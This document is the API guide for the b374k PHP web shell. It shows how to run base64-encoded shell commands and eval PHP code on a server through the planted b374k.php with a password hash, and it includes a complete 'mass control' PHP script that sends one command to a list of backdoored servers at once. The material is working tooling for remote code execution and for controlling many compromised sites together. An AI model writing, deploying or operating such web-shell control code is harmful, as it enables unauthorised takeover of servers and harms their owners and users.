# API #


## Introduction ##
From version 2.3 you can use the API to remotely control the shell.
Parameter
```
s_pass : your shell password in md5 format
cmd : to execute shell command (in base64 format)
eval : to evalute php code (in base64 format)
```

example 1 :
```
http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
```
This example use password _b374k_ in md5 format which is _0de664ecd2be02cdd54234a0d1229b43_ and send command _uname -a_ which is _dW5hbWUgLWE=_ in base64 format

example 2 :
```
http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
```
This example use password _b374k_ in md5 format which is _0de664ecd2be02cdd54234a0d1229b43_ and send php code _phpinfo();_ which is _cGhwaW5mbygpOw==_ in base64 format

## Implementation ##
For mass control implementation using php, see example below

Create a file _list.txt_ contains url to b374k shell and its password
```
http://www.myserver1.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
http://www.myserver2.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
http://www.myserver3.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
http://www.myserver4.com/b374k.php,0de664ecd2be02cdd54234a0d1229b
```

Create a file _mass.php_ and open it in browser
```
<?php
set_time_limit(0);

$list_file = "list.txt";
$list = is_file($list_file)? file("list.txt",FILE_SKIP_EMPTY_LINES) : false;
$self = $_SERVER['PHP_SELF'];
$result = "";

if($list!==false){
	if(isset($_REQUEST['submit'])){
		$val = empty($_REQUEST['val'])? "" : base64_encode(urldecode($_REQUEST['val']));
		$type = empty($_REQUEST['type'])? "" : trim($_REQUEST['type']);
		foreach($list as $l){
			$l = explode(",", $l);
			$url = trim($l[0]);
			$s_pass = trim($l[1]);
			$query = $url."?s_pass=".$s_pass;
			if(!empty($val)) $query .= "&".$type."=".$val;
			$content = @file_get_contents($query);
			if(!empty($content)) $content = htmlspecialchars($content);
			
			$result .= "<table>";
			$result .= "<tr><th>".$url."</th></tr>";
			$result .= "<tr><td><pre>".$content."</pre></td></tr>";
			$result .= "</table>";
		}
	}
}
else $result = "error : unable to open file ".$list_file;
?><!DOCTYPE html>
<head>
<title>b374k mass control</title>
<style type="text/css">
body{
	background:#000000;
	color:#888888;
	margin:0;
	padding:0;
	font-family:sans-serif;
	font-size:12px;
}
table{
	width:100%;
}
table th{
	background:#222;
}
table td{
	margin:0;padding:0;
}
textarea,input,select{
	background:#333;
	margin:0;
	padding:4px 0;
	border:0;
	color:#fff;
}
pre{
	padding:0px 8px;
}
</style>
</head>
<body>
<form action="<?php echo $self; ?>" method="post">
<table>
<tr><td colspan="2"><textarea name="val" style="width:100%;height:80px;" /></textarea></td></tr>
<tr>
	<td><input type="submit" name="submit" value="Go !" style="width:100%;height:30px;" /></td>
	<td style="width:100px;">
		<select name="type" style="width:90px;height:30px;">
			<option value="cmd">cmd</option>
			<option value="eval">eval</option>
		</select>
	</td>
</tr>
</table>
</form>
<div id="output"><?php echo $result; ?></div>
</div>
</html>
```